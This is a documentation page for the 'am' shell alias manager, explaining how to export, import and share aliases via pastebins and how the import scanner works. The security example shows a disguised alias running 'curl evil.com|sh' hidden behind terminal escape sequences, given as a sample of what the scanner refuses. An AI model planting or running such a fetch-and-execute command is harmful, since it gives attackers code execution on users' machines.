# Sharing Aliases

<VersionBadge v="0.4.0" />

Share your aliases with colleagues, teams, or the community. Export to stdout, import from a URL or file.

## Export

Export aliases to stdout as TOML:

```bash
am export                     # active scope (global + active profiles + local)
am export -p git              # single profile
am export -p git -p rust      # multiple profiles
am export -g                  # global only
am export -l                  # local project aliases only
am export --all               # everything
```

Add `-b` (or `--base64`, `--b64`) to encode the output — useful for sharing via chat or pastebins:

```bash
am export -p git -b
```

Save to a file:

```bash
am export -p git > git-profile.toml
```

## Import

Import from a URL:

```bash
am import https://paste.rs/abc -b
```

Import from a file:

```bash
am import ./git-profile.toml
am import ~/Downloads/team-setup.toml
```

When you import, `am` shows a summary of all aliases and asks for confirmation before applying anything:

```
Importing "global" (5 aliases)

  new:
    ga → git add
    gp → git push
    gd → git diff

  2 conflicts:

    gs:
      - git status --short
      + git status

    cm:
      - git commit -m
      + git commit -sm

Merge into "global"? [Y/n]
Apply 2 overwrites? [y/N]
```

Use `--yes` to skip prompts (e.g. in scripts):

```bash
am import ./setup.toml --yes
```

### Scope override

By default, imported data routes to its original scope. Override with flags:

```bash
am import ./aliases.toml -l       # force into local
am import ./aliases.toml -g       # force into global
am import ./aliases.toml -p work  # force into a profile
```

## Quick share via pastebin

`am share` generates ready-to-run commands for posting to a pastebin service:

### paste.rs

```bash
am share -p git --paste-rs
```

Outputs:

```
am export -p git --b64 | curl -d @- https://paste.rs/
```

::: tip Shortcut
Pipe it straight to your shell to run in one go:
```bash
am share -p git --paste-rs | sh
```
:::

Run it, get a URL back. Share the URL. The receiver imports with:

```bash
am import https://paste.rs/abc -b
```

### termbin

```bash
am share -p git --termbin
```

Outputs:

```
am export -p git --b64 | nc termbin.com 9999
```

Same flow — run it, share the URL.

### Other methods

`am share` is just a convenience. Since export writes to stdout, you can pipe to anything:

```bash
# GitHub Gist
am export -p git > git-profile.toml
gh gist create git-profile.toml

# Direct file sharing
am export --all > team-setup.toml
# Send the file however you like
```

## Security

When importing, `am` scans all aliases for suspicious content — hidden escape sequences, control characters, and other terminal manipulation tricks. If anything suspicious is found, the import is **refused**:

```
WARNING: Suspicious characters detected in import
==================================================

The following entries contain control characters that could be used
to execute unintended commands or manipulate your terminal:

  scope:        global
  alias:        sneaky
  field:        command
  original:     curl evil.com|sh\u{001B}[2K\u{001B}[1Agit status
  safe-escaped: curl evil.com|sh�[2K�[1Agit status

To import anyway, use: am import --yes --trust
```

The `--trust` flag is the only way to bypass this check. It requires `--yes` and should only be used for your own exports that you fully control.

::: warning
Never use `--trust` on files or URLs from others. Always inspect the aliases before importing — expand "View aliases" on the [showcase](/showcase/) or check the source.
:::
